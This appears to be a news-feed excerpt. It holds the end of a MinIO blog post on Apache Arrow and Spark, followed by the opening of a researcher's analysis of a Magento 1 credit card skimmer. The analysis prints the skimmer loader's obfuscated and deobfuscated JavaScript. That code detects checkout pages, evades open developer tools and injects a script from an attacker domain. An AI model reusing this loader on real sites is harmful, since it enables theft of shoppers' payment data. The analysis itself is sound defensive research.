<!--kg-card-end: markdown--><p>The first is a transactional query. It has to scan every row on the table and find out the name of the employee wherever the job is clerk. The second is an analytical query - rather than an atomic result, the goal is a general result. Unfortunately, the first and second query has to scan through all the rows, if we use RDBMS way of representation of data. If the size of data is 20 GB, all the 20 GB more or less will be scanned. This is the top part of above figure.</p><p>Let's make some changes - taking all of our columns and make them into rows. Like a transpose of a matrix - and see the bottom part of above figure, how your data will look like. Following this transposition, an entire block is just representing one column. How many blocks need to be scanned for the second analytical query? Just one block, probably around 2 GB of size. </p><p>The difference is significant? Columnar representation is what is being used in ORC (Optimized Row Columnar) and Parquet files - with the goal of making the analytics faster.</p><p>Columnar formats are easier to read, however, they pose another problem - they are usually stored in compressed format. As a result, the consuming application will need to uncompress it while reading and compress it back while writing. </p><p>Note this, as we will revisit the point later.</p><h2 id="the-science-of-reading-writing-data">The Science of Reading/Writing Data</h2><p>Let me explain briefly how reading/writing happens in a software system and what role is played by the hardware.</p><p>Microprocessors normally use two methods to connect external devices: <strong>memory mapped</strong> or <strong>port mapped</strong> I/O. </p><p>Memory mapped I/O is mapped into the same address space as program memory and/or user memory, and is accessed in the same way.</p><p>Port mapped I/O uses a separate, dedicated address space and is accessed via a dedicated set of microprocessor instructions.</p><p>In memory mapped approach, I/O devices are mapped into the system memory map along with RAM and ROM. To access a hardware device, simply read or write to those 'special' addresses using the normal memory access instructions.The advantage to this method is that every instruction which can access memory can be used to manipulate an I/O device.</p><p>Usually applications use Port mapped I/O. If we are using memory mapped I/O for a particular format, it will be faster, especially for analytical needs. When combined with our columnar data format, then it becomes even more advantageous.</p><p>Welcome to <a href="https://arrow.apache.org/">Apache Arrow</a>. </p><p>Arrow uses memory mapped I/O and avoids serialization/deserialization overheads when you convert between most of the formats while leveraging the columnar data format. </p><p>Thanks to <a href="https://wesmckinney.com/">Wes McKinney</a> for this brilliant innovation, its not a surprise that such an idea came from him and team, as he is well known as the creator of Pandas in Python. He calls Arrow as the future of data transfer.</p><h2 id="store-data-in-minio-in-arrow-format">Store Data in MinIO in Arrow Format</h2><p>This is how we are going to make MinIO even more powerful. </p><p>We are going to store that data in Arrow and then let the consuming applications read it - resulting in dramatically increased speeds. Step one has us putting the data into MinIO in Arrow format. I was using my own approach until I saw a much better implementation from <a href="https://github.com/BryanCutler">Bryan Cutler</a>, whose contributions include integrating Arrow formats to Spark as well.</p><p>We will start with a a .csv file, in this case movie ratings downloaded from the <a href="https://movielens.org/">movielens</a> site. For illustration purposes, I took about 100K rows. First, let's write a Spark program to read this CSV file and write it into Arrow format using Arrow RDD. You can get the full code from the link given towards the bottom of this article.</p><p>Step 1: build.sbt , please note the arrow dependencies</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1990w" sizes="(min-width: 720px) 720px"><figcaption>See lines 18 and 19, we have Arrow related dependencies with Spark</figcaption></figure><p>We will use Spark 3.0, with Apache Arrow 0.17.1</p><p>The ArrowRDD class has an iterator and RDD itself. For creating a custom RDD, essentially you must override mapPartitions method. You can browse the code for details. </p><p>Next, start MinIO and create a bucket named "arrowbucket". </p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Create a bucket named "arrowbucket" in MinIO</figcaption></figure><p>Let's use ArrowRDD and create an ArrowFile in local. Here is the code:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.48.45-AM.png 2372w" sizes="(min-width: 720px) 720px"><figcaption>Writing Arrow file with ArrowRDD</figcaption></figure><p>Lines 22 to 34 do the main part. Compile and execute the code:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-4.50.42-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Execute the code</figcaption></figure><p>As you see from code, the Arrow format file is is generated in data directory. Let's copy it to the MinIO bucket we created earlier (bucket name is arrowbucket)</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-5.04.23-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Copy the arrow file we generated to MinIO bucket</figcaption></figure><p>Let's have some fun now. </p><p>Use your favorite Python editor, and write some code. First, let us start with Spark reading the file and converting it to a dataframe, with and without Arrow enabled options.</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.52.01-AM.png 1698w" sizes="(min-width: 720px) 720px"><figcaption>Initializing Spark context and connection parameters to Minio</figcaption></figure><p>Start your Spark cluster. Complete the code with all settings and check whether we created the Spark context successfully. To ensure that our app (named Minio-Arrow-Spark at line 8) is connected, just check the Spark UI. You should see something like this:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-11.46.01-AM.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Spark UI (default localhost:8080) is showing our app is connected</figcaption></figure><p>Run the below code now:</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.09.47-PM.png 1708w" sizes="(min-width: 720px) 720px"><figcaption>Reading from MinIO with Arrow format "not enabled" (top) and "enabled"(bottom)</figcaption></figure><p>The output which displays the time, shows the power of this approach. The performance boost is tremendous, almost 50%.</p><p>Recall that we created an ArrowRDD earlier and used it to write to MinIO. Let us test the memory consumption in reading it. We will use different methods.</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-11.17.22-PM.png 1882w" sizes="(min-width: 720px) 720px"><figcaption>See the results - Arrow is zero copy memory format</figcaption></figure><p>We are reading different file formats and seeing the memory consumption for each. As it is evident, Arrow format based files are zero copy - almost no memory consumed at all.</p><p>By combining MinIO with the Arrow Format, you can enhance your analytics ecosystem and virtually eliminating the friction associated with converting between different formats. This is primarily due to the reduction of serialization overhead.</p><h2 id="code">Code </h2><p>You can see the<a href="https://github.com/passionbytes/ArrowRDD"> Jupyter notebook and ArrowRDD code here</a>.</p><p>Ravishankar Nair is a technology evangelist, a consultant and an inspiring speaker. He is the CTO of PassionBytes, based in Florida. With his vast expertise in data engineering, Ravi provides consultancy in machine learning, modern data lakes and distributed computing technology. You can refer to his other articles related to MinIO here:</p><p>1) <a href="https://blog.min.io/modern-data-lake-with-minio-part-1/">Modern Data Lakes with Minio - Part 1</a></p><p>2) <a href="https://blog.min.io/modern-data-lake-with-minio-part-2/">Modern Data Lakes with MinIO - Part 2</a></p><p>3) <a href="https://blog.min.io/building-an-on-premise-ml-ecosystem-with-minio-powered-by-presto-r-and-s3select-feature/">Building an …</a></p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/">https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/</a></em></p>]]>
            </description>
            <link>https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534274</guid>
            <pubDate>Sun, 20 Sep 2020 14:32:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing Recent's Magento 1 Credit Card Skimmer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534259">thread link</a>) | @avastel
<br/>
September 20, 2020 | https://antoinevastel.com/fraud/2020/09/20/analyzing-magento-skimmer.html | <a href="https://web.archive.org/web/*/https://antoinevastel.com/fraud/2020/09/20/analyzing-magento-skimmer.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>This week, <a href="https://sansec.io/news/magento-1-beyond-june">Sansec</a> revealed that several Magento 1 websites had been compromised by hackers that had been able to inject credit card skimmers on pages of the checkout process.
Since I wanted to better understand how these credit skimmers were working, I decided to conduct a quick analysis.</p>
<p>I started from Sansec’s tweet that seemed to indicate that the skimmer loader was available on <code>facelook.no/en_US/pixel.js</code>.</p>
<p><img src="https://antoinevastel.com/assets/media/tweet_skimmer.png"></p>
<h2 id="analyzing-the-skimmer-loader">Analyzing the skimmer loader</h2>
<p>If we visit the URL above, we obtain a (slightly) obfuscated file with the following content (I don’t link to this URL with a proper link to avoid being flagged as a malicious website by search engines):</p>
<div><div><pre><code><span>var</span> <span>a0a</span><span>=</span><span>[</span><span>'loud'</span><span>,</span><span>'lize'</span><span>,</span><span>'oudf'</span><span>,</span><span>'/wid'</span><span>,</span><span>'item'</span><span>,</span><span>'e-st'</span><span>,</span><span>'//aj'</span><span>,</span><span>'.com'</span><span>,</span><span>'lare'</span><span>,</span><span>'ckou'</span><span>,</span><span>'scri'</span><span>,</span><span>'ntBy'</span><span>,</span><span>'bute'</span><span>,</span><span>'/cdn'</span><span>,</span><span>'atic'</span><span>,</span><span>'|one'</span><span>,</span><span>'chec'</span><span>,</span><span>'appe'</span><span>,</span><span>'este'</span><span>,</span><span>'rHei'</span><span>,</span><span>'ndCh'</span><span>,</span><span>'setA'</span><span>,</span><span>'ntsB'</span><span>,</span><span>'head'</span><span>,</span><span>'clou'</span><span>,</span><span>'eche'</span><span>,</span><span>'emen'</span><span>,</span><span>'kout'</span><span>,</span><span>'/scr'</span><span>,</span><span>'leme'</span><span>,</span><span>'rWid'</span><span>,</span><span>'bug'</span><span>,</span><span>'Fire'</span><span>,</span><span>'flar'</span><span>,</span><span>'5d/c'</span><span>,</span><span>'-cgi'</span><span>,</span><span>'chro'</span><span>,</span><span>'loca'</span><span>,</span><span>'/103'</span><span>,</span><span>'epag'</span><span>,</span><span>'cart'</span><span>,</span><span>'onep'</span><span>,</span><span>'src'</span><span>,</span><span>'step'</span><span>,</span><span>'getE'</span><span>,</span><span>'isIn'</span><span>,</span><span>'itia'</span><span>,</span><span>'teEl'</span><span>,</span><span>'crea'</span><span>,</span><span>'test'</span><span>,</span><span>'ttri'</span><span>,</span><span>'yTag'</span><span>,</span><span>'rHTM'</span><span>,</span><span>'|fir'</span><span>,</span><span>'age|'</span><span>,</span><span>'ght'</span><span>,</span><span>'49f5'</span><span>,</span><span>'ipts'</span><span>,</span><span>'t|on'</span><span>,</span><span>'get.'</span><span>,</span><span>'pche'</span><span>,</span><span>'ild'</span><span>,</span><span>'oute'</span><span>,</span><span>'Name'</span><span>,</span><span>'inne'</span><span>,</span><span>'axcl'</span><span>,</span><span>'tion'</span><span>];(</span><span>function</span><span>(</span><span>a</span><span>,</span><span>b</span><span>){</span><span>var</span> <span>c</span><span>=</span><span>function</span><span>(</span><span>d</span><span>){</span><span>while</span><span>(</span><span>--</span><span>d</span><span>){</span><span>a</span><span>[</span><span>'push'</span><span>](</span><span>a</span><span>[</span><span>'shift'</span><span>]());}};</span><span>c</span><span>(</span><span>++</span><span>b</span><span>);}(</span><span>a0a</span><span>,</span><span>0x1e0</span><span>));</span><span>var</span> <span>a0b</span><span>=</span><span>function</span><span>(</span><span>a</span><span>,</span><span>b</span><span>){</span><span>a</span><span>=</span><span>a</span><span>-</span><span>0x0</span><span>;</span><span>var</span> <span>c</span><span>=</span><span>a0a</span><span>[</span><span>a</span><span>];</span><span>return</span> <span>c</span><span>;};</span><span>function</span> <span>a0c</span><span>(){</span><span>var</span> <span>a</span><span>=</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x33'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x13'</span><span>)</span><span>+</span><span>'th'</span><span>]</span><span>-</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x35'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x13'</span><span>)</span><span>+</span><span>'th'</span><span>]</span><span>&gt;</span><span>0xa0</span><span>;</span><span>var</span> <span>b</span><span>=</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x33'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x8'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2c'</span><span>)]</span><span>-</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x35'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x8'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2c'</span><span>)]</span><span>&gt;</span><span>0xa0</span><span>;</span><span>return</span><span>!</span><span>(</span><span>b</span><span>&amp;&amp;</span><span>a</span><span>||!</span><span>(</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x15'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x14'</span><span>)]</span><span>&amp;&amp;</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x15'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x14'</span><span>)][</span><span>a0b</span><span>(</span><span>'0x19'</span><span>)</span><span>+</span><span>'me'</span><span>]</span><span>&amp;&amp;</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x15'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x14'</span><span>)][</span><span>a0b</span><span>(</span><span>'0x19'</span><span>)</span><span>+</span><span>'me'</span><span>][</span><span>a0b</span><span>(</span><span>'0x22'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x23'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x39'</span><span>)</span><span>+</span><span>'d'</span><span>]</span><span>||</span><span>a</span><span>||</span><span>b</span><span>));}</span><span>if</span><span>(</span><span>new</span> <span>RegExp</span><span>(</span><span>a0b</span><span>(</span><span>'0x1e'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2b'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x5'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x10'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x4'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x20'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2a'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0xe'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x41'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2f'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x7'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x31'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x41'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2f'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x1c'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0xe'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x41'</span><span>)</span><span>+</span><span>'t'</span><span>)[</span><span>a0b</span><span>(</span><span>'0x26'</span><span>)](</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x1a'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x37'</span><span>)])</span><span>&amp;&amp;!</span><span>new</span> <span>RegExp</span><span>(</span><span>a0b</span><span>(</span><span>'0x1d'</span><span>))[</span><span>a0b</span><span>(</span><span>'0x26'</span><span>)](</span><span>window</span><span>[</span><span>a0b</span><span>(</span><span>'0x1a'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x37'</span><span>)])){</span><span>var</span> <span>a0d</span><span>=</span><span>document</span><span>[</span><span>a0b</span><span>(</span><span>'0x25'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x24'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0xf'</span><span>)</span><span>+</span><span>'t'</span><span>](</span><span>a0b</span><span>(</span><span>'0x42'</span><span>)</span><span>+</span><span>'pt'</span><span>);</span><span>var</span> <span>a0e</span><span>=</span><span>a0b</span><span>(</span><span>'0x3e'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x36'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x3a'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x40'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x3f'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x18'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x11'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2e'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x1b'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x2d'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x17'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x38'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x16'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x3d'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x3'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x3b'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x30'</span><span>)</span><span>+</span><span>'js'</span><span>;</span><span>a0d</span><span>[</span><span>a0b</span><span>(</span><span>'0xa'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x27'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x1'</span><span>)](</span><span>a0b</span><span>(</span><span>'0x1f'</span><span>),</span><span>a0e</span><span>);</span><span>a0d</span><span>[</span><span>a0b</span><span>(</span><span>'0xa'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x27'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x1'</span><span>)](</span><span>'id'</span><span>,</span><span>a0b</span><span>(</span><span>'0xd'</span><span>)</span><span>+</span><span>'d'</span><span>);</span><span>document</span><span>[</span><span>a0b</span><span>(</span><span>'0x21'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x12'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0xb'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x28'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x34'</span><span>)](</span><span>a0b</span><span>(</span><span>'0xc'</span><span>))[</span><span>a0b</span><span>(</span><span>'0x3c'</span><span>)](</span><span>0x0</span><span>)[</span><span>a0b</span><span>(</span><span>'0x6'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x9'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x32'</span><span>)](</span><span>a0d</span><span>);</span><span>numInterval</span><span>=</span><span>setInterval</span><span>(</span><span>function</span><span>(){</span><span>if</span><span>(</span><span>a0c</span><span>()){</span><span>if</span><span>(</span><span>document</span><span>[</span><span>a0b</span><span>(</span><span>'0x21'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x12'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x0'</span><span>)</span><span>+</span><span>'Id'</span><span>](</span><span>a0b</span><span>(</span><span>'0xd'</span><span>)</span><span>+</span><span>'d'</span><span>)){</span><span>document</span><span>[</span><span>a0b</span><span>(</span><span>'0x21'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x12'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x0'</span><span>)</span><span>+</span><span>'Id'</span><span>](</span><span>a0b</span><span>(</span><span>'0xd'</span><span>)</span><span>+</span><span>'d'</span><span>)[</span><span>a0b</span><span>(</span><span>'0x33'</span><span>)</span><span>+</span><span>a0b</span><span>(</span><span>'0x29'</span><span>)</span><span>+</span><span>'L'</span><span>]</span><span>=</span><span>''</span><span>;}}},</span><span>0x12c</span><span>);}</span>
</code></pre></div></div>
<p>Since the obfuscation is quite basic, we use online tools like <a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a>
to deobfuscate this first program.</p>
<p>Once deobfuscated, you obtain the following JS file:</p>
<div><div><pre><code><span>function</span> <span>a0c</span><span>()</span> <span>{</span>
    <span>var</span> <span>a</span> <span>=</span> <span>window</span><span>.</span><span>outerWidth</span> <span>-</span> <span>window</span><span>.</span><span>innerWidth</span> <span>&gt;</span> <span>160</span><span>;</span>
    <span>var</span> <span>b</span> <span>=</span> <span>window</span><span>.</span><span>outerHeight</span> <span>-</span> <span>window</span><span>.</span><span>innerHeight</span> <span>&gt;</span> <span>160</span><span>;</span>
    <span>return</span> <span>!</span><span>(</span><span>b</span> <span>&amp;&amp;</span> <span>a</span> <span>||</span> <span>!</span><span>(</span><span>window</span><span>.</span><span>Firebug</span> <span>&amp;&amp;</span> <span>window</span><span>.</span><span>Firebug</span><span>.</span><span>chrome</span> <span>&amp;&amp;</span> <span>window</span><span>.</span><span>Firebug</span><span>.</span><span>chrome</span><span>.</span><span>isInitialized</span> <span>||</span> <span>a</span> <span>||</span> <span>b</span><span>));</span>
<span>}</span>
<span>if</span> <span>(</span><span>new</span> <span>RegExp</span><span>(</span><span>'onepage|checkout|onestep|firecheckout|onestepcheckout|onepagecheckout'</span><span>).</span><span>test</span><span>(</span><span>window</span><span>.</span><span>location</span><span>)</span> <span>&amp;&amp;</span> <span>!</span><span>new</span> <span>RegExp</span><span>(</span><span>'cart'</span><span>).</span><span>test</span><span>(</span><span>window</span><span>.</span><span>location</span><span>))</span> <span>{</span>
    <span>var</span> <span>a0d</span> <span>=</span> <span>document</span><span>.</span><span>createElement</span><span>(</span><span>'script'</span><span>);</span>
    <span>var</span> <span>a0e</span> <span>=</span> <span>'//ajaxcloudflare.com/cdn-cgi/scripts/10349f55d/cloudflare-static/widget.js'</span><span>;</span>
    <span>a0d</span><span>.</span><span>setAttribute</span><span>(</span><span>'src'</span><span>,</span> <span>a0e</span><span>);</span>
    <span>a0d</span><span>.</span><span>setAttribute</span><span>(</span><span>'id'</span><span>,</span> <span>'cloud'</span><span>);</span>
    <span>document</span><span>.</span><span>getElementsByTagName</span><span>(</span><span>'head'</span><span>).</span><span>item</span> <span>0</span><span>.</span> <span>appendChild</span><span>(</span><span>a0d</span><span>);</span>
    <span>numInterval</span> <span>=</span> <span>setInterval</span><span>(</span><span>function</span> <span>()</span> <span>{</span>
        <span>if</span> <span>(</span><span>a0c</span><span>())</span> <span>{</span>
            <span>if</span> <span>(</span><span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'cloud'</span><span>))</span> <span>{</span>
                <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'cloud'</span><span>).</span><span>outerHTML</span> <span>=</span> <span>''</span><span>;</span>
            <span>}</span>
        <span>}</span>
    <span>},</span> <span>300</span><span>);</span>
<span>}</span>
</code></pre></div></div>
<p>This short code snippet is not doing a lot of things besides loading the actual skimmer and verifying that the browser dev tools are not opened.
We can go through the code to analyze what it’s doing more in details:</p>
<div><div><pre><code><span>// This function verifies if the dev tools are opened</span>
<span>function</span> <span>a0c</span><span>()</span> <span>{</span>
    <span>// Simple check to verify if the devtools are opened on the left/right</span>
    <span>var</span> <span>a</span> <span>=</span> <span>window</span><span>.</span><span>outerWidth</span> <span>-</span> <span>window</span><span>.</span><span>innerWidth</span> <span>&gt;</span> <span>160</span><span>;</span>
    
    <span>// Detect if devtools are opened on the top/bottom</span>
    <span>var</span> <span>b</span> <span>=</span> <span>window</span><span>.</span><span>outerHeight</span> <span>-</span> <span>window</span><span>.</span><span>innerHeight</span> <span>&gt;</span> <span>160</span><span>;</span>

    <span>// These 2 conditions won't help to detect if devtools are opened in another window     </span>
    <span>// That's why they also use other heuristics like testing the presence of window.Firebug</span>
    <span>return</span> <span>!</span><span>(</span><span>b</span> <span>&amp;&amp;</span> <span>a</span> <span>||</span> <span>!</span><span>(</span><span>window</span><span>.</span><span>Firebug</span> <span>&amp;&amp;</span> <span>window</span><span>.</span><span>Firebug</span><span>.</span><span>chrome</span> <span>&amp;&amp;</span> <span>window</span><span>.</span><span>Firebug</span><span>.</span><span>chrome</span><span>.</span><span>isInitialized</span> <span>||</span> <span>a</span> <span>||</span> <span>b</span><span>));</span>
<span>}</span>
</code></pre></div></div>
<p>The remainder of the code calls the function that verifies if dev tools are opened or not.
If the dev tools are not opened and if the code is executed on a page where credit card information is available, then it loads the actual skimmers:</p>
<div><div><pre><code><span>// window.location contains information about the current location of the document: https://developer.mozilla.org/en-US/docs/Web/API/Window/location </span>
<span>// Test if the user is on a whose url included one of the strings included in the regexp but not on the cart page</span>
<span>if</span> <span>(</span><span>new</span> <span>RegExp</span><span>(</span><span>'onepage|checkout|onestep|firecheckout|onestepcheckout|onepagecheckout'</span><span>).</span><span>test</span><span>(</span><span>window</span><span>.</span><span>location</span><span>)</span> <span>&amp;&amp;</span> <span>!</span><span>new</span> <span>RegExp</span><span>(</span><span>'cart'</span><span>).</span><span>test</span><span>(</span><span>window</span><span>.</span><span>location</span><span>))</span> <span>{</span>
    <span>// If it's the case, the script create a script element that'll load another script (the actual skimmer)</span>
    <span>var</span> <span>a0d</span> <span>=</span> <span>document</span><span>.</span><span>createElement</span><span>(</span><span>'script'</span><span>);</span>
    <span>// URL of the skimmer</span>
    <span>var</span> <span>a0e</span> <span>=</span> <span>'//ajaxcloudflare.com/cdn-cgi/scripts/10349f55d/cloudflare-static/widget.js'</span><span>;</span>
    <span>a0d</span><span>.</span><span>setAttribute</span><span>(</span><span>'src'</span><span>,</span> <span>a0e</span><span>);</span>
    <span>a0d</span><span>.</span><span>setAttribute</span><span>(</span><span>'id'</span><span>,</span> <span>'cloud'</span><span>);</span>
    <span>document</span><span>.</span><span>getElementsByTagName</span><span>(</span><span>'head'</span><span>).</span><span>item</span> <span>0</span><span>.</span> <span>appendChild</span><span>(</span><span>a0d</span><span>);</span>
    <span>// Append the script to the page to load the actual skimmer</span>
    <span>numInterval</span> <span>=</span> <span>setInterval</span><span>(</span><span>function</span> <span>()</span> <span>{</span>
